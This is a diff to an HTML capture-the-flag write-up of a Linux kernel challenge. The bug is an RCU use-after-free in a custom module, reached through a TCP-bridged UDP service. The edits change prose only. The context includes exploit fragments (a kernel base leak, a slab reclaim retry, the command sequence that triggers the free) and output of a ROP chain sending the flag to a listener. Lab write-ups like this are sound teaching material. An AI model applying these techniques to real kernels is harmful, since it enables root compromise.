@@ -189,7 +189,7 @@
           <h2>Challenge setup</h2>
           <p>You get <code>bzImage</code>, an unstripped <code>vmlinux</code>, an initramfs and three kernel modules — <code>nkrcu.ko</code>, <code>nkmon.ko</code>, <code>nknet.ko</code>. Linux 6.1.184, x86-64, one vCPU. The flag is at <code>/flag</code>, mode 0400, owned by root.</p>
           <p>The serial console drops to a <code>nobody</code> shell, but a player never reaches it — only TCP port 31337 is exposed.</p>
-          <p>The service speaks NKTP. Framing fields are network order, payload fields are native little-endian:</p>
+          <p>The guest service is UDP, but the platform cannot expose a UDP port, so a small TCP front end bridges the two — <code>proxy.py</code> ships with the handout and reads the protocol's own <code>plen</code> to reframe the stream. Framing fields are network order, payload fields are native little-endian:</p>
           <ul>
             <li>Request: <code>u32 magic | u8 ver | u8 cmd | u16 seq | u16 plen | u16 cksum | data[plen]</code></li>
             <li>Response: same header, <code>cmd</code> and <code>seq</code> echoed</li>
@@ -296,7 +296,7 @@ call_rcu(&amp;desc-&gt;rcu_head, nk_desc_free_rcu);   /* kfree after the grace p
           <div class="note">
             Which function holds the defect is genuinely ambiguous. Read as a <code>snap_create</code> bug, the snapshot cache leaks an RCU pointer past the critical section. Read as a <code>remove</code> bug, the object has two owners and teardown handles one. Both readings imply different patches — a refcount, or an <code>nk_snaps[]</code> sweep.
           </div>
-          <p>Neither patch is sufficient alone. <code>nkrcu_snap_iter()</code> copies the array under the spinlock and runs the callback outside it, by design, so the monitor can sleep:</p>
+          <p>The sweep alone is not enough. <code>nkrcu_snap_iter()</code> copies the array under the spinlock and runs the callback outside it, by design, so the monitor can sleep:</p>
           <pre><code>spin_lock_bh(&amp;nk_snap_lock);
 for (i = 0; i &lt; NK_MAX_SNAPS; i++)
     if (nk_snaps[i].snap_id)
@@ -329,7 +329,7 @@ kernel_base = kernel_fn - PRINTK_OFF</code></pre>
 
     if rop_kaddr == candidate:
         return str_kaddr, rop_kaddr</code></pre>
-          <p>Under SLUB's per-CPU LIFO freelist the object comes straight back. Docker cgroup and netfilter allocations occasionally steal the slot, hence the retry.</p>
+          <p>Under SLUB's per-CPU LIFO freelist the object comes straight back. The guest still allocates on its own — skbs on the receive path for the very request being sent, plus workqueue and timer work — so the slot is occasionally taken first, hence the retry.</p>
           <p>Triggering the free is three commands in a fixed order:</p>
           <pre><code>send_cmd(CMD_SNAP,   p64(desc_id))   # nk_snaps[0].desc = desc_kaddr
 send_cmd(CMD_REMOVE, p64(desc_id))   # list_del_rcu + call_rcu
@@ -671,7 +671,7 @@ if __name__ == "__main__":
           <p>The exploit never sees the flag — it arrives on the listener:</p>
           <pre><code>Connection received on 172.17.0.2 47352
 CTF{&lt;64 hex chars&gt;}</code></pre>
-          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. From an earlier boot, so the addresses differ from the run above:</p>
+          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, so the addresses differ from the run above:</p>
           <pre><code>[   19.591444] BUG: kernel NULL pointer dereference, address: 0000000000000000
 [   19.591459] #PF: supervisor instruction fetch in kernel mode
 [   19.591459] CPU: 0 PID: 40 Comm: kworker/0:2 Tainted: G           O       6.1.184 #1
